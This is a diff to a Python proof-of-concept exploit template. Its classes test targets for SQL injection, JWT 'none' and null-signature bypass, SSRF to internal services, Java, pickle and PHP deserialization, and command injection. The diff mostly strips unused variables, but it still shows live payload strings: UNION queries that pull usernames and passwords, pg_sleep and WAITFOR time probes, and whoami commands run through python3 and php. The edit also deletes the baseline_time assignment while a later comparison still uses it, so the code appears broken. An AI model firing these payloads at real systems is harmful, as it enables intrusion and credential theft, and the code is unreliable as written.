@@ -7,8 +7,6 @@ POC 模板基类
 
 import argparse
 import base64
-import hashlib
-import hmac
 import json
 import logging
 import re
@@ -16,8 +14,7 @@ import sys
 import time
 import urllib.parse
 from dataclasses import dataclass, field
-from datetime import datetime
-from typing import Any, Dict, List, Optional, Tuple
+from typing import Any, Dict, List, Tuple
 
 import requests
 
@@ -114,14 +111,6 @@ class SQLInjectionPOC(BasePOC):
             "' UNION SELECT 1,2,3,4,5,6,7,8,9,10 FROM users--",
             "' UNION SELECT NULL,NULL,NULL,NULL FROM users--",
         ]
-
-        data_exfil_payloads = [
-            "' UNION SELECT username,password FROM users--",
-            "' UNION SELECT NULL,username,NULL,password,NULL FROM users--",
-            "' UNION SELECT table_name FROM information_schema.tables--",
-            "' UNION SELECT column_name FROM information_schema.columns WHERE table_name='users'--",
-        ]
-
         for payload in base_payloads:
             try:
                 data = {param: payload} if param else {"q": payload}
@@ -176,14 +165,6 @@ class SQLInjectionPOC(BasePOC):
             "' AND (SELECT COUNT(*) FROM users)>0--",
             "' OR 1=1--",
         ]
-
-        false_payloads = [
-            "' AND 1=2--",
-            "' AND 1=2#",
-            "'; SELECT CASE WHEN 1=2 THEN 1 ELSE 0 END--",
-            "' AND (SELECT COUNT(*) FROM users)=999999--",
-        ]
-
         time_payloads = [
             "'; SELECT CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END--",
             "'; IF (1=1) WAITFOR DELAY '00:00:05'--",
@@ -194,7 +175,6 @@ class SQLInjectionPOC(BasePOC):
         try:
             data = {param: baseline_payload} if param else {"q": baseline_payload}
             baseline_response = self.send_request("POST", target, data=data)
-            baseline_time = baseline_response.elapsed.total_seconds()
             baseline_len = len(baseline_response.text)
             baseline_status = baseline_response.status_code
         except Exception as e:
@@ -240,7 +220,7 @@ class SQLInjectionPOC(BasePOC):
             try:
                 data = {param: time_payload} if param else {"q": time_payload}
                 start_time = time.time()
-                time_response = self.send_request("POST", target, data=data)
+                self.send_request("POST", target, data=data)
                 elapsed = time.time() - start_time
 
                 if elapsed >= 5:
@@ -302,7 +282,7 @@ class SQLInjectionPOC(BasePOC):
                 try:
                     data = {param: payload} if param else {"q": payload}
                     start_time = time.time()
-                    response = self.send_request("POST", target, data=data)
+                    self.send_request("POST", target, data=data)
                     elapsed = time.time() - start_time
 
                     if elapsed >= 5 and elapsed > baseline_time * 3:
@@ -388,7 +368,6 @@ class AuthBypassPOC(BasePOC):
     def detect_jwt_algorithm_manipulation(self, target: str) -> Dict[str, Any]:
         results = {"method": "JWT algorithm manipulation", "payloads": [], "exploitable": False}
 
-        jwt_pattern = r"eyJ[A-Za-z0-9_-]+\.eyJ[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+"
         token = None
 
         try:
@@ -501,7 +480,7 @@ class AuthBypassPOC(BasePOC):
                                 }
                             )
                             results["exploitable"] = True
-                            logger.info(f"JWT none算法检测到漏洞")
+                            logger.info("JWT none算法检测到漏洞")
                 except Exception as e:
                     logger.debug(f"JWT none测试失败: {e}")
 
@@ -512,9 +491,6 @@ class AuthBypassPOC(BasePOC):
 
     def detect_jwt_null_signature(self, target: str) -> Dict[str, Any]:
         results = {"method": "JWT null signature", "payloads": [], "exploitable": False}
-
-        jwt_pattern = r"eyJ[A-Za-z0-9_-]+\.eyJ[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+"
-
         try:
             response = self.send_request("GET", target)
             auth_header = response.headers.get("Authorization", "")
@@ -564,7 +540,7 @@ class AuthBypassPOC(BasePOC):
                                 }
                             )
                             results["exploitable"] = True
-                            logger.info(f"JWT null signature检测到漏洞")
+                            logger.info("JWT null signature检测到漏洞")
                 except Exception as e:
                     logger.debug(f"JWT null signature测试失败: {e}")
 
@@ -858,13 +834,6 @@ class SSrfPOC(BasePOC):
 
     def detect_internal_network_probing(self, target: str) -> Dict[str, Any]:
         results = {"method": "Internal network probing", "payloads": [], "exploitable": False}
-
-        internal_ips = [
-            ("10.0.0.1", "10.255.255.255"),
-            ("172.16.0.1", "172.31.255.255"),
-            ("192.168.0.1", "192.168.255.255"),
-        ]
-
         internal_services = [
             "http://127.0.0.1:22",
             "http://127.0.0.1:23",
@@ -1025,33 +994,6 @@ class DeserializationPOC(BasePOC):
 
     def detect_java_serialization(self, target: str, param: str) -> Dict[str, Any]:
         results = {"method": "Java serialization", "payloads": [], "exploitable": False}
-
-        base64_pattern = re.compile(r"^[A-Za-z0-9+/]+=*$")
-
-        ysoserial_gadgets = [
-            "URLDNS",
-            "Groovy1",
-            "BeanShell1",
-            "C3P0",
-            "Clojure",
-            "CommonsBeanUtils1",
-            "CommonsCollections1",
-            "CommonsCollections2",
-            "CommonsCollections3",
-            "CommonsCollections4",
-            "CommonsCollections5",
-            "CommonsCollections6",
-            "MozillaRhino1",
-            "Spring1",
-            "Spring2",
-        ]
-
-        serialization_markers = [
-            b"ac ed",  # AC ED 00 05 - Java serialization magic bytes
-            b"rO0",  # rO0AB - Base64 encoded Java serialization
-            b"O:21:",  # O:21:" - PHP serialization
-        ]
-
         test_payloads = [
             {"name": "Java Serialized", "data": "rO0ABXQAVFxQcm9jZXNzQnVpbGRlci5jbGFzcw=="},
             {
@@ -1110,7 +1052,7 @@ class DeserializationPOC(BasePOC):
                         }
                     )
                     results["exploitable"] = True
-                    logger.info(f"Python pickle检测到漏洞")
+                    logger.info("Python pickle检测到漏洞")
             except Exception as e:
                 logger.debug(f"Python pickle测试失败: {e}")
 
@@ -1144,7 +1086,7 @@ class DeserializationPOC(BasePOC):
                         }
                     )
                     results["exploitable"] = True
-                    logger.info(f"PHP unserialize检测到漏洞")
+                    logger.info("PHP unserialize检测到漏洞")
             except Exception as e:
                 logger.debug(f"PHP unserialize测试失败: {e}")
 
@@ -1327,7 +1269,7 @@ class CommandInjectionPOC(BasePOC):
             try:
                 data = {param: payload} if param else {"q": payload, "cmd": payload}
                 start_time = time.time()
-                response = self.send_request("POST", target, data=data)
+                self.send_request("POST", target, data=data)
                 elapsed = time.time() - start_time
 
                 if elapsed >= 5 and elapsed > baseline_time * 3:
@@ -1368,15 +1310,6 @@ class CommandInjectionPOC(BasePOC):
             ("; python3 -c \"import os; os.system('whoami')\"", "Python exec"),
             ("; php -r \"system('whoami');\"", "PHP system"),
         ]
-
-        out_of_band_indicators = [
-            "connection",
-            "refused",
-            "timeout",
-            "error",
-            "failed",
-        ]
-
         for payload, description in blind_payloads:
             try:
                 data = {param: payload} if param else {"q": payload, "cmd": payload}
